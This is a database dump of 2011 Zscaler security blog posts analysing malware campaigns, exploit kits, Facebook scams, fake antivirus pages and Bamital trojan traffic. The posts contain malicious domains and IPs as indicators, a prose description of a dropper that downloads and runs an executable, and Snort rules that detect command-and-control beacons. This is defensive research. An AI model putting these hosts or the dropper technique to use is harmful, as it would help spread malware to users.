INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (384, 'Google News Search Results For Laurence Fishburne Leading To Malicious Sites', 'ThreatLabz', 'June 10, 2011', 'One of our blog readers, Mr. Jon Leathery informed me yesterday about a link in a Google News search leading to a malicious website. “Laurence Fishburne leaving CSI”, was a popular topic recently and was being taken advantage of to spread malware. Here is the screenshot of a Google news search with that term:       Look at the highlighted news in the image above. If a user clicks on that link, it will redirect them to a malicious website containing heavily obfuscated JavaScript, which will download additional malware onto their system. The user will be only redirected to the malicious website if they are coming from Google News based on HTTP referrer header, a common technique that we see to further obfuscate the attack. Let’s look at the news page:     The above news site contains the malicious obfuscated JavaScript code at the top of the page. Here is a screenshot of the source code:    Remember, the malicious JavaScript code is only inserted when the referrer is the Google News site. If you visit this website directly, the malicious code will not be loaded. Here is what the obfuscated JavaScript looks like:    Once decoded, it will reveal a script tag, pointing to a malicious website. Here is the decoded content:  The above malicious link then redirects the victim multiple times, finally loading a page containing heavily obfuscated JavaScript code. Here is what the final exploit code looks like:    The above code is highly obfuscated with every string randomized. Automated analysis tools failed to decode it and manual analysis was required, which I will explain in a separate blog. The above malicious exploit code exploits various known vulnerabilities to download additional malware on the system. Here is the Fiddler capture of the malicious requests:    The exploit code downloads multiple malicious JAR files on the system after exploitation. The VirusTotal results remains very poor for one of the malicious JAR files, with only 2 out of 43 Antivirus triggering on it. Fake Antivirus pages also commonly use the technique of checking referrer strings before loading page content. The malicious content is only loaded if the victim is coming from a Google search page. The trust that people place in Google search results is being abused to social engineer victims into believing that malicious search result links are safe. Unfortunately, nothing could be further from the truth.    Be Safe  Umesh', 'Analysis;Exploit;Malware', 'https://www.zscaler.com/blogs/research/google-news-search-results-laurence-fishburne-leading-malicious-sites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (385, 'Blackhat Spam SEO Leading Directly To A Virus Download', 'Julien Sobrier', 'June 07, 2011', 'Attackers usually use some form of social engineering technique to fool users into downloading and executing a malicious executable - they scare users with a fake antivirus page, they present users with a video that requires a new software or codec update, they claim the user\'s browser or Flash version is out of date, etc.  Last week, I found several Google search results for popular terms leading directly to a virus download. The following 6 domains were hijacked by attackers:      	pancrase.org  	legacyhealthgroup.com  	movingmidway.com  	playnormous.com  	tombraiderinc.com  	dogbreedsbook.com      When users click on one of these domains in a Google search result page, they are redirected to another domain. This new page ensures that the request has been received from a live user with a web browser. This is accomplished by looking at the user agent and at the Referer value (does the user come from Google?). If the test is successful, the user is then redirected to vicrtorytrip.net or gfaster.net.    These 2 domains serve an executable with the name www.com. It is detected as malicious by only 5 AV vendors out of 42.      	  		  			  		  		  			Virustotal result page  		  	      All the redirections are done through HTTP 302 redirections, so no new page is shown to the user. As a result, users may think the file download was done from Google, because it does not appear that they left the Google search result page. This is the \"trick\" the attackers rely on to ensure that users trust the executable file, in addition to the name www.com which looks like a domain name rather than a file name.      	  		  			  		  		  			Malicious file download attempt  		  	        Once again, the best protection, and often the only one, is to educate users to not download and install any file unless they fully trust its origin, and explicitly requested the download.  -- Julien', 'AntiVirus;Compromise', 'https://www.zscaler.com/blogs/research/blackhat-spam-seo-leading-directly-virus-download');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (386, 'Buying Software Online Is Getting More And More Risky', 'Julien Sobrier', 'June 04, 2011', 'Google searches for popular software (Windows, Microsoft Office, etc.) often contain links to fake online stores since at least December 2010. Google has done very little to clean up the search results.       	  		  			  		  		  			Only 1 of these results is legitimate!  		  	      The situation is actually getting worse. More and more of these malicious search results redirect users to malicious pages containing malware, generally a fake AV page. About 8% of the links redirected to a malware pages in May compared to fewer than 1% in January.    Some of the malicious domains seen in May were adremekj2.cz.cc, drxjgjd.co.cc, krrhlrxl.co.cc, etc.    Top 1,000 hijacked domains    The most popular domains used by hijackers in May were mit.edu (nemis.mit.edu, scripts.mit.edu), harvard.edu (www.schepends.harvard.edu), stanford.edu (assu.stanford.edu), and notably ign.com (ffvault.ign.com), which ranks #158 by Alexa.    Only 5% of the malicious links in Google were flagged, but the number of malware sites overall (fake AV, browser exploits, malicious applets, etc.) have been going down since January.    Be very careful if you need to buy software online - use trusted websites only, and do not believe any website offering bigger discounts than usual.    -- Julien', 'Abuse', 'https://www.zscaler.com/blogs/research/buying-software-online-getting-more-and-more-risky');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (387, 'Zscaler Safe Shopping Now Available For Google Chrome', 'Julien Sobrier', 'May 26, 2011', 'The number of fake online stores displaying downloadable software at a steep discount remains high. It can be hard to distinguish these sites from legitimate online stores. Therefore, I had previously released Zscaler Safe Shopping for Firefox and Firefox mobile to warn users when they are visiting such sites. The extension is now available for Google Chrome. This extension also flags compromised stores, legitimate sites that are under the full control of malicious hackers.Get Zscaler Safe Shopping from the Chrome web storeZscaler Safe Shopping warningWhen a user access a fake or compromised store, the extension displays a warning at the top of the page. It warns the users to not enter any sensitive information such as a credit card number which might be used illegally.Zscaler Safe Shopping warning for a fake storeOptionsThe list of fake and compromised domains is updated regularly. You can choose how often the latest version should be downloaded in the options. You can also choose to whitelist domains to prevent any warning from being displayed.Zscaler Safe Shopping optionsThis is my first extension for Google Chrome. Let me know if you find any issues. It has been tested with Google Chrome 11.0.696.68 on Windows.You can download the extension directly from the Chrome Web Store. Don\'t forget to rate the extension if you like it!-- Julien', 'Compromise', 'https://www.zscaler.com/blogs/research/zscaler-safe-shopping-now-available-google-chrome');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (388, 'Cashing In On ‘ScamBook’', 'ThreatLabz', 'May 23, 2011', 'Last week, Umesh blogged extensively about the Facebook Scams. The previous scams have demonstrated that Facebook is struggling to contain these attacks. While some attacks seek to spread malicious code, many that we see are attempts to profit from shady advertising.    Yesterday I saw a posting on friend\'s Facebook wall entitled “DOG ATTACKS A KID! Real video!”.        Clicking on the link lands you on a fake “YouTube” page which is actually hosted at the “watch.in” domain. This page asks the victim for “Security Verification” to comply with YouTube\'s Anti-SPAM regulations.        This is simply social engineering, attempt to build trust with the victim and lead them to believe that the site is legitimate. The page prompts the victim to resolve a CAPTCHA for verification (the CAPTCHA image never changes even if you refresh the page repeatedly).    Now after resolving the CAPTCHA and clicking submit, the victim is sent to another page which asks them to take a YouTube survey for “Age Verification”.      This is where the attacker generates his profit. Clicking on any of the survey links will take victim to a third party survey which earns the attacker a few cents for every survey completed..        Additionally, the text which the victim inputs, is not verified against the CAPTCHA string, but instead is used as a comment, and the malicious post is then added to the victim’s wall to further spread the scam to the victim\'s other friends.        As shown in snapshots above, even if one adds a malicious URL in the CAPTCHA test, it will be posted on the wall. This vector can be used to redirect victims to malicious sites to cause further damage.    This attack spreads with varying video and title entries. Yesterday the postings were entitled “DOG ATTACKED A KID!” today the newer malicious postings have title \"this woman has ..! LOL\".      This is yet another fake advertising campaign designed to earn money by coercing victim’s into completing surveys. Facebook needs to take steps toward stopping these deceptive postings as they are becoming far too common. Be on the lookout for these and other more malicious Facebook scams.    Until then, enjoy Facebook but think before you click…         - Ajit Hatti', 'Scam', 'https://www.zscaler.com/blogs/research/cashing-scambook');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (389, 'Is 360.CN Evil?', 'ThreatLabz', 'May 20, 2011', '... a tough and controversial question to answer (I\'m sure there will comments on this).         360.cn is a Chinese provider of \"free security software\", more specifically: \"360.cn is a Chinese anti virus program that integrates with IE\" (reference) ... huh, \"integrates\" with my browser how? And \"free\" usually means there is some other revenue stream than end-user licensing.         360.cn was developed by Qihoo, a Beijing-based community search company. There has been some controversy surrounding Qihoo and its 360 security suite, such as it reporting other anti-virus software and search tools as being malicious (reference) and doing QQ (IM/chat) session hijacking (reference). Within the past year of Qihoo going public, there have been further controversies - including reports of the company spying, hacking, and leaking data (reference). And then there are the rumors that the 360 software includes spyware - and that they may have affiliations with PRC Gov\'t to track, monitor, and police user\'s online activity (reference).         Looking at our web logs, I can see a number of requests regularly beaconing out doing HTTP POST requests to sites like:           conf.f.360.cn/getconf.php    qurl.f.360.cn/check_outchain.php           All with the User-Agent string \"Post_Multipart\"         These POST requests typically average around 1200 bytes in data (excludes HTTP header), and 360.cn responds back with 164 byte status message. Below is the status that I pulled:    To protect customer privacy and also handle the volume of transactions that we do - content of the transactions are not stored, so it is hard to say what data is leaving the network of these hosts - whether the data is user/host tracking information, keystrokes, or just license information it is hard to tell. But the frequent beaconing seems to be more spyware like in nature than say a daily check-in for latest signatures or something similar. I\'ll see if I can get some meaningful packet traces out of the software to find out what data is included in the POSTs.         The current McAfee SiteAdvisor report for 360.cn shows it as having a poor reputation (note though, 360.cn is also technically a competitor to McAfee, albeit a small one):      McAfee marks the site and its affiliates as bad - containing spyware. It also shows an affiliation with a Chinese Gov\'t site: miibeian.gov.cn (Ministry of Industry and Information Technology Department). One such sample that McAfee flagged in this report was also uploaded to VirusTotal ... 21/40 A/V vendors identified the binary as malicious.         This puts security companies such as ourselves in an interesting predicament - do we flat out block 360.cn? Probably not. Is traffic to the domain, its affiliates and wares suspicious? Certainly. It is then left up to security products to detect the malicious binaries and is up to organizations to make the decisions about these sites. If you don\'t use 360.CN products in your organization, it probably wouldn\'t hurt to block traffic to their domains.', 'Analysis', 'https://www.zscaler.com/blogs/research/360cn-evil');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (390, 'Increase In Use Of PDFs For Spam', 'Julien Sobrier', 'May 18, 2011', 'In recently weeks, I have noticed an increase in the use of PDF files for spam. Instead of uploading an HTML page using a compromised account, as seen shown in a previous post \"Hundreds of College and Government websites still redirecting to fake stores\", spammers are instead uploading PDF files. My guess for their motivation, is that PDF files are less likely to be checked for spam than plain HTML pages.Most of the spam PDF files contain text only.Example of spam PDFThe goal of the spammer is to redirect users to a malicious website. This is done using a piece of JavaScript embedded into the PDF file.JavaScript snippet from the PDF file In this example, the user is redirected to hxxp://searchglobalsite.com/in.cgi?23 (the URL is obfuscated in the PDF file) which then redirects to hxxp://www.results-today.com/.hxxp://www.results-today.com/The list of websites hosting spam PDF files is very similar to what I have reported earlier. It includes college web sites, governmental sites, and wiki pages, such as the following:hxxp://forum.wiki.usfca.edu/file/view/file10.pdfhxxp://www.lapspecs.com/wiki/_media/http:cr43.pdf hxxp://www.dublincore.biz/accessibilitywiki/ImplementersNews?action=AttachFile&do=get&target=dub14.pdf hxxp://wikiglobe.org/en/images/c/c9/Texas-veterans-home-loan.pdfhxxp://wiki.solusvm.com/images/c/c6/Uk-cash-loans.pdfhxxp://nspcommunity.net/wiki/images/e/e8/Small-loan-business.pdfhxxp://wiki.fossasia.org/images/6/67/Ship-loans.pdfhxxp://vuas.net/~dpmccann/mw/images/Real-estate-mortgage-loans.pdfA Google search for \"cialis viagra canadian pharmacy filetype:pdf site:.edu\" for example, provides plenty of other examples.-- Julien', 'Abuse;Phishing', 'https://www.zscaler.com/blogs/research/increase-use-pdfs-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (391, 'Facebook Under Attack By Scammers', 'ThreatLabz', 'May 17, 2011', 'Facebook is facing no shortage of attacks from scammers. Yesterday, I posted a blog about a recent scam being circulated on the Facebook network and only a few hours later, we uncovered yet another one. The goal of this scam remains the same as earlier one, namely to coerce Facebook users into completing various surveys which in turn generate money for the scammer. The interesting fact about this scam is that it is not only posting the malicious message to the wall of the victim’s friends, but it also gets a list of online friends to send them chat message like “hey you are still there?Check my wall for the link ^_^ It showed me who viewd my profile. Amazing :p\" with a link to the malicious domain. Here is what the wall posts look like:  When a user clicks on the links in the message, they are presented with a fake pop up displaying how many friends are supposedly viewing the victim’s profile. Here is a screenshot:Remember, this is fake message and each time it is accessed, it simply generates a random number– this has nothing to do with actual users viewing your profile (something that Facebook does not share). The page also suggests that the user must copy and paste JavaScript into the address bar, which will of course execute the JavaScript in the context of the victim. This is similar to the earlier scam. Once the user runs that malicious code, they are presented with some fake messages requiring that they undertake surveys or view additional messages: Here are the screenshots:     As mentioned, the attack also sends chat messages to online friends in order to further spread the attack. Here is the screenshot of the associated source code:The malicious code also forces the victim to become a fan of “OSAMA” Facebook pages. Here is the screenshot of that code:Facebook is currently losing this cat and mouse game. As quickly as they take scams down, new ones appear and take their place, each time evolving the tactics slightly to evade detection. This is second scam we uncovered in only a few hours. Facebook needs to do a better job protecting its users. Both of these scams use the same techniques of social engineering users into pasting JavaScript into the URL bar – something that we’re seeing on a more regular basis and something that would never be required by a legitimate page.Nasty Scams!!! Umesh', 'Analysis', 'https://www.zscaler.com/blogs/research/facebook-under-attack-scammers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (392, 'Yet Another Facebook Scam – You Look So Stupid In This Video', 'ThreatLabz', 'May 16, 2011', 'Today, we have come across yet another rapidly spreading Facebook scam. The ultimate aim of this scam is to coerce Facebook users into completing various surveys which in turn generate money for the scammer. The messages arrive with embedded Flash video and different messages such as “WTF!! You look so stupid in this video” or “yo, why are you on this video” etc. Below is a screenshot of such messages:\r\n\r\n \r\n\r\nThe post displays fake meta data showing the number of “Views”, “Likes”, etc. to make the posts appear more genuine. When a user clicks on the video link, the Flash file loads in the background. Once the loaded, it prompts the user to play a fake video. When the user clicks again to play the video, it looks like,\r\n\r\n\r\nThe above message displays instructions with keyboard shortcuts that cause the victim to paste clipboard information in the address bar. The flash file itself sets the clipboard data with malicious JavaScript which further spreads the attack. Here is what the malicious JavaScript looks like:\r\n \r\nLet’s format this for better readability. Here is a formatted version:\r\n\r\nIf user runs this malicious JavaScript in the address bar, the script will randomly load one of two JavaScript files from different domains. The “config.js” is actually used to further spread this scam using different descriptions of the video. This JavaScript file not only posts the same flash video message to user’s wall, but also their friends walls. Here is partial screenshot of “config.js” file:\r\n\r\nThe above code contains all the configuration settings for spreading this message with different text messages and different domains. The “config.js” file also contains the code for posting the message to wall of every Facebook friend.\r\n\r\nHere is what the source of “verify.js” looks like:\r\n\r\nThe above file references yet another JavaScript file. This referenced file is used to keep track of real time stats. The user is further prompted with message box asking “Please verify your identity” by taking surveys as shown below:\r\n\r\nIt will keep checking for the survey to be completed even if you click “Complete” button without taking the survey. This is yet another scam run by attackers to earn some money by encouraging Facebook users to complete surveys that pay for completion. This is not the first time we have seen such a scam spreading on Facebook. Attackers are doing an excellent job by taking advantages of both social engineering and social networking.\r\n\r\nBelieve me - I don’t look stupid in that video!\r\n\r\nUmesh', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/yet-another-facebook-scam-you-look-so-stupid-video');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (393, 'India’s DNA E-newspaper Website Infected With Fake Antivirus Campaign', 'ThreatLabz', 'May 15, 2011', 'DNA (Daily News and Analysis) is an Indian daily English language newspaper. According to Wikipedia, DNA ranks 8th among the top ten English dailies in India. Recently, the Zscaler solution was blocking access to this site, as it contained malicious content. Here is the homepage of this website:\r\n\r\n\r\nThe ‘Today’s E-newspaper’ link (circled above) is an online version of the printed periodical. We discovered that one of the pages from this e-newspaper site was infected with malicious script. Here is the screenshot of that page:\r\n\r\nThe malicious script tag had been inserted in plain text as can be seen in this screenshot of page\r\nsource:\r\n \r\n\r\n The malicious script tag directs the victim’s browser to ‘hxxp://vcvsta.com/ur.php’. This page then redirects the user to another malicious site (‘hxxp://www4.to-gysave.byinter.net,), which will again redirect victim to random sites hosting fake antivirus campaigns. Here is the screenshot displaying a fake malware alert:\r\n\r\n\r\n\r\nAs usual, page employs social engineering tactics, which display fake warning messages and threat names to scare the victim into downloading a fake AV product. The VirusTotal result for the downloaded binary currently shows only 10/43 AV engines detecting this particular attack. Here we have yet another example of a legitimate and popular websites being infected so that the attacker(s) can impact a significant number of victims.\r\n\r\nUmesh', 'Compromise;Malware', 'https://www.zscaler.com/blogs/research/indias-dna-e-newspaper-website-infected-fake-antivirus-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (394, 'Geek.com Hacked With An Exploit Kit', 'ThreatLabz', 'May 15, 2011', 'Update 15/04/11 @ 3.40pm IST: With further research, it has come to our attention that many different pages like main homepage, about us page are infected with malicious Iframe pointing to different malicious sites.\r\n\r\n\r\nWe often blog about popular web sites being infected with different exploit kits. The attack vector remains the same, namely injecting a malicious HTML Iframe or script tag into the legitimate pages. One of our blog readers, Mr. David S. emailed me to share a popup alert that he was receiving on one of the pages of Geek.com. Geek has been a very popular site for online technology resources since 1996. They feature the latest news and reviews from the technology world. Here is the home page:\r\n\r\n\r\nIf you look at the screenshot above, you will notice that they feature the latest articles on the home page. The latest topic or article currently discussed is “Call of Duty: Modern Warfare 3 details leaked”. As this is first article is highlighted and “Call of Duty” is a very popular game, one can assume that many people have fallen victim to this attack. It is in the article itself where the malicious Iframe has been injected. Here is the screenshot of the article in question:\r\n\r\nThe article was published on May 13th. As usual, the malicious Iframe is injected at the bottom of the page. Here is a screenshot of the malicious Iframe:\r\n\r\nThe malicious Iframe redirects victims to a malicious website hosting an exploit kit. Once you visit, heavily obfuscated JavaScript is returned which will target various known vulnerabilities. Here is what the exploit looks like:\r\n\r\n\r\nThe decoded version of this malicious JavaScript results in the same vulnerabilities being exploited as we have seen in past blogs on exploit kits, so I will omit details on decoding the JavaScript. For interested readers, a Webpawet report is available for the malicious JavaScript.\r\n\r\nUnfortunately, we see hundreds of attacks such as this each and every day. Many legitimate websites are being compromised by taking advantages of poor coding practices in web applications. Attackers are constantly on the lookout for popular websites or top news sites as targets for their attacks. Users need to be aware that no site is a safe site.\r\n\r\nUmesh', 'Analysis;Exploit Kit;Malware', 'https://www.zscaler.com/blogs/research/geekcom-hacked-exploit-kit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (395, 'The Most Common Obfuscation Techniques In Fake AV Pages', 'Julien Sobrier', 'May 14, 2011', 'We have shown some of the heavy JavaScript obfucation techniques used by Fake AV pages, but the vast majority of such pages use lighter, yet effective techniques. Those techniques are aimed at bypassing detection devices (IDS, antivirus, etc.), rather than hiding the source code. The creators focus on making life difficult for those tasked with writing signatures to detect the malicious content.    HTML encoding and white space    The FakeAV pages often encode random HTML elements using HTML entities.    	  		  			  		  		  			Use of HTML entities in the TITLE tag  		  	    This is a very common and basic evasion techniques. FakeAV pages have now however, brought this to the next level, and even encode HTML attributes (ID, Name, Class), not just text content.       	  		  			  		  		  			Use of HTML entities in tag attributes  		  	    They also add random white space throughout the page. This causes problems for string matching algorithms.    JavaScript and CSS encoding    While most of the CSS information is contained in external files, some inline CSS is included within the HTML document. Attackers use hexadecimal encoding (\\xXX) in combination with JavaScript. Again, the encoded characters differ from page to page.       	  		  			  		  		  			Encoded inline CSS  		  	    This hexadecimal encoding is actually used for most inline JavaScript code on the page.       	  		  			  		  		  			Hexadecimal encoding in JavaScript code  		  	    JavaScript obfuscation    The FakeAV pages use some JavaScript obfuscation, as seen in most malicious pages, but it tends to be very light, and the code spans over a few line only.            	  		  			  		  		  			Obfuscated JavaScript  		  	      I have found over 100 variants of the Fake AV pages in the past year. The code and the obfuscation techniques have changed quite a bit, but the result is still very much the same. I have encountered only about 10 visually different Fake AV pages.    -- Julien', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/most-common-obfuscation-techniques-fake-av-pages');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (396, 'Rajasthan State Marketing Site Infected With Malicious Code', 'ThreatLabz', 'May 09, 2011', 'India’s Rajasthan State Co-operative Marketing Federation Ltd (http://rajfed.gov.in/) has been infected with a malicious script tag. This government site promotes the objectives of procuring agricultural produce from farmers through the member societies on support prices declared by the Govt. of India. Here is the home page of this site:          The malicious script has been injected at the bottom of this page. Here is the screenshot of source page,        Below, you can see a decoded version of the script using Malzilla.       The decoded script tag leads to JavaScript from “hxxp://cs.cskick.cn/cs/sc.js”. Currently, this malicious site is down. A quick Google search for this domain shows that it has been involved with malicious activity in the past. Trend Micro has issued a report for a separate threat hosted at that same domain.    Umesh', 'Compromise', 'https://www.zscaler.com/blogs/research/rajasthan-state-marketing-site-infected-malicious-code');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (397, 'Help Center URL Validation Vulnerability (CVE-2010-1885) Campaign', 'ThreatLabz', 'May 06, 2011', 'I\'ve recently noticed a number of transactions to:    vvvvvv.dyndns-mail.com/  46.254.16.61 (PTR: www.asl-s.com)       Update: we\'re now seeing this attack hosted as well on:    blog.dyndns-blog.com    googlepics.dyndns.tv    whitehorse.dyndns-server.com    everybodythere.dyndns-blog.com    smalloffice1.dyndns-office.com    alwaystv.dyndns-free.com      showmustgoon.dyndns.info    webarchive.dyndns-web.com        Some of the transactions have referer strings from pages from a number of sites (i.e., these sites are compromised/hosting content that links to the attack pages), for example:    www.crescent-news.com  www.trainingmag.com  *.ejecentral.com.mx  www.louisville.com  www.investmentu.com    www.the-daily-record.com    www.tennispoint.com    www.recordpub.com    blog.eduzones.com    www.planodevivienda.com    www.surfnewsnetwork.com    (ads.)moneymorning.com    www.gooofullsearch.com    www.smartautosavings.com    www.times-gazette.com    www.daily-jeff.com    www.twinsburgbulletin.com    www.rvag.com    www.mimusicagratis.net    www.gooofull.com    elpartidodehoy.es    www.linuxforums.org    www.newtvsoft.com         (the list goes on ... I\'ll make additions with the more interesting sites as I see them)      Some of these sites are also blocked by GSB, but initially I was not able to  track down the malicious content. Fortunately Wepawet was able to help me through the maze of content being loaded on the pages. The report is visible here.         googlepics.dyndns.tv/news/1997    whitehorse.dyndns-server.com/news/1997    blog.dyndns-blog.com/news/1997    vvvvvv.dyndns-mail.com/news/1997    --->       Turns out that it exploits the Microsoft Help Center URL Validation Vulnerability (CVE-2010-1885).         Unfortunately it doesn\'t appear that the Wepawet sandbox falls victim to the exploit or is able to actually obtain a malicious payload from this. I\'ll analyze the HCP parameter / exploit further and include any information I find about the payload.           Update:    Here\'s the first stage decode of the payload (spaced to read better):      Update 2 (final dropper decode):      Uses cscript.exe (command-line version of Windows Script Host) to run commands that are \"echoed\" to a file \".js\" which downloads contents from:         hxxp://vvvvvv.dyndns-mail.com:80/news/c80e9994fe5fa7af48d3a00010b9f349.php?start=4&thread_id=3256081&forum_id=1997&         and stores them into a file bonjour.exe at the root directory. This executable is then launched and all processes containing the string \"help\" are forcefully killed.         Unfortunately, I have not been able to directly download the executable payload from vvvvvv.dyndns-mail.com, I keep getting a 302 response to Google.           There is also a Java attack being served from this exploit kit - possibly Incognito,    but I can\'t access the control panel: hxxp://blog.dyndns-blog.com/admin.php (I get an \"error 3\" text response).         Sample of .jar file drops:           vvvvvv.dyndns-mail.com/news/8db59781b281e80e1284a8847f73d58d.jar      blog.dyndns-blog.com/news/8db59781b281e80e1284a8847f73d58d.jar      blog.dyndns-blog.com/news/ef36787f21fb429c4c7cb2212902dcbd.jar      blog.dyndns-blog.com/news/09ec45a029f86af501a1391c2a6e781c.jar         Note: I\'ve tried to download the executable payloads spoofing the referer / user-agent and coming from different hosts without success. It is possible that the hash value filename is time or source sensitive.      Had a friend send me a copy of the binary:  V/T Report: 2/41    ThreatExpert Report shows network connectivity to:    67.18.166.173:10000/load.php?file=#    where # = 0-19 (possibly piecemeal malware building)    81.177.33.95/forum.php         Here\'s an earlier variant (April 12, 2011) of the malware that I was able to find, however it is just as elusive at being pinned to a specific malware family:    V/T Report: 9/42    ThreatExpert Report, network activity:    summer-ciprys.com/load.php?file=#    joomla-desing.com/admin.php', 'Exploit Kit;Malware', 'https://www.zscaler.com/blogs/research/help-center-url-validation-vulnerability-cve-2010-1885-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (398, 'Zscaler Safe Shopping Available For Firefox 4 Mobile', 'Julien Sobrier', 'May 06, 2011', 'After porting Search Engine Security to Firefox Mobile, I have also made Zscaler Safe Shopping available for smartphones. This add-on warns users when they are browsing a fake or compromised store. If you happen to visit one of these sites, you will be warned to not enter sensitive information, such as a credit card number or a mailing address.Mobile notificationsVersion 1.1 of Zscaler Safe Shopping offers the same features as version 1.0 for Desktop browsers. However, the notification system on the mobile version is a slightly different. Extension developers can use either the built-in alert system, or display a dialog box to the user. The former system is less intrusive, but it seems that the implementation is different depending on the OS. Firefox 4 Mobile on Windows displays a nice panel at the botttom of the phone, while my Android phone shows a tiny message at the top of the phone. On my phone, the warning is barely noticeable, and does not work when the browser is in full-screen.Desktop notification on WindowsDesktop notification on a phoneI\'ve therefore added an option to choose the appropriate notification system. Users can choose the best option for their system.Choose the type of alert for your OSLow bandwidth requirementsThe list of fake and compromised stores is stored locally. It is refreshed once a day, but you can change it to a longer interval using the options. The blacklist is about 11kb.Zscaler Safe Shopping options-- Julien', 'Compromise', 'https://www.zscaler.com/blogs/research/zscaler-safe-shopping-available-firefox-4-mobile');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (399, 'Another Trojan Bamital Pattern', 'ThreatLabz', 'May 06, 2011', 'The other day I detected a handful of Bamital infected clients beaconing out with a different pattern than that listed in EmergingThreats, and thought I\'d post something for the masses to consume and be on the lookout for in their networks.  Microsoft\'s Malware Protection Center, lists a first iteration of the Trojan back in 2009 to do pop-up/injected advertising on behalf of the attacker ... but since then the malware family has grown in variations and scope of capability - for example, search result manipulation and malware dropping.  There are now 29 variants listed in the MS encyclopedia, including those published in mid/late April 2011.  For example,The pattern in EmergingThreats was created from this February 2011 ThreatExpert report:alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"ET TROJAN W32 Bamital or Backdoor.Win32.Shiz CnC Communication\"; flow:established,to_server; content:\"/favicon.ico?0=\"; http_uri; content:\"&1=\"; http_uri; content:\"&2=\"; http_uri; content:\"&3=\"; http_uri; content:\"&4=\"; http_uri; content:\"&5=\"; http_uri; content:\"&6=\"; http_uri; content:\"&7=\"; http_uri; classtype:trojan-activity; reference:url,www.threatexpert.com/report.aspx?md5=fbcdfecc73c4389e8d3ed7e2e573b6f1; sid:2012299; rev:2;)The different HTTP URI pattern that I\'m seeing for the Bamital C&C communication is:/message.php?subid=&br=&os=&flg=&id=&ad=&ver=And the C&Cs that I have observed have typically been utilizing free domain services like \".co.cc\" and \".cz.cc\" ... this type of abuse is nothing new for these \"TLDs.\"Here is a snippet of domains and servers used for this C&C infrastructure:00a8cf363ddca6b75e1b5c781b0ba226.co.cc00a8cf363ddca6b75e1b5c781b0ba226.cz.cc150224dce21c1056c5140bdfb2e1e8c2.co.cc150224dce21c1056c5140bdfb2e1e8c2.cz.cc2675589750ef32cc7fe75d7ff8e3fcbd.co.cc2675589750ef32cc7fe75d7ff8e3fcbd.cz.cc4bc53ed6c2c5a32606588c1d72d16a59.co.cc4bc53ed6c2c5a32606588c1d72d16a59.cz.cc5c099914bf7eaacb8aab1cab73cdd90b.co.cc5c099914bf7eaacb8aab1cab73cdd90b.cz.cc7ffea8c792bb81efca737acc44861bc3.co.cc7ffea8c792bb81efca737acc44861bc3.cz.cc85fd1f94d59ff6936e99c281f99a0953.co.cc85fd1f94d59ff6936e99c281f99a0953.cz.cc936d16bf80262add68838f96677a9620.co.cc936d16bf80262add68838f96677a9620.cz.cccb9df029fbcea991d8aa64f97ff9fd40.co.cccb9df029fbcea991d8aa64f97ff9fd40.cz.ccff7cca28c0bdf5a60f09b4ec52db39bf.co.ccff7cca28c0bdf5a60f09b4ec52db39bf.cz.ccThe above C&C domains resolve only to a handful of IPs:112.175.243.21 (KR)112.175.243.22 (KR)112.175.243.23 (KR)112.175.243.24 (KR)207.58.177.96 (US)Open-source info on these IPs confirms their badness as C&Cs as well as hosting malicious fake videos/plugins (for example, malwareurl.com, malc0de.com, CleanMX).There have also been some other open-source reports that include some .info domains with the same hash-like domain format used to host the Bamital C&C infrastructure that uses the same beaconing pattern I identified above, e.g.,DA9341709E53AD11D84C6284EDA86043.infoD5403E5622841DD806915A4DE67DD9F8.info87D53FBC27630E53A7CA13B7242DEFB3.infoWith this type of bulk registration of new domains to keep the C&C infrastructure alive, you really need to have a set of signatures in addition to domain/IP filtering.  Keep an eye out for this other Bamital pattern in your networks:alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Zscaler TROJAN W32 Bamital or Backdoor.Win32.Shiz CnC Communication\"; flow:established,to_server; content:\"/message.php?subid=\"; http_uri; content:\"&br=\"; http_uri; content:\"&os=\"; http_uri; content:\"&flg=\"; http_uri; content:\"&id=\"; http_uri; content:\"&ad=\"; http_uri; content:\"&ver=\"; http_uri; classtype:trojan-activity; reference:url,research.zscaler.com/2011/05/another-trojan-bamital-pattern.html/;)', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/another-trojan-bamital-pattern');
